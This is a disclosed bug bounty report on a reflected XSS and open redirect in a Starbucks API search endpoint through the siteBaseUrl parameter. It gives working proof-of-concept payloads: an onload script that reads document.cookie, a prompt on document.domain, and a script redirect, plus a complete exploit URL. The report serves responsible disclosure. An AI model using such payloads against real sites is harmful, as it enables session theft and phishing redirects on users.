# Reflected XSS in openapi.starbucks.com /searchasyoutype/v1/search?x-api-key=

## Report Details
- **Report ID**: 213190
- **URL**: https://hackerone.com/reports/213190
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-03-13T19:56:52.180Z
- **Disclosed**: 2017-07-25T21:03:56.312Z

## Reporter
- **Username**: an0n-j
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hi Starbucks team,
While testing i founded Reflected XSS in openapi.starbucks.com that can also lead to Open redirect
Vulnerable link
==========
https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=
Vulnerable parameter
===============
siteBaseUrl
Payloads
======
```1). http://googl.com/%0a<body onload=%61lert(%64ocument.%63ookie)>%
2). http://googl.com/%0a<body onload=prompt(%64ocument.domain)>%```
For Open redirect the payload is
=====================
```
http://googl.com/%0a<script>window.location='https://google.com';</script>%
```

So the finalized link with payload is given below
```
https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=███████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a<body onload=%61lert(%64ocument.%63ookie)>%
```

POC has been attached

## Attachments
No attachments
